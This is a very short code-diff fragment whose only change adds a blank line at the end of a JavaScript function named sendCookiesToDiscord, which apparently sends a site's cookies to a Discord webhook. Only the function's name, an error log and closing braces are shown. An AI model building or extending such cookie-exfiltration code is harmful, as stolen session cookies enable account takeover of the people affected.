@@ -390,3 +390,4 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = tr
     console.error('Webhook error:', error);
   });
 }
+
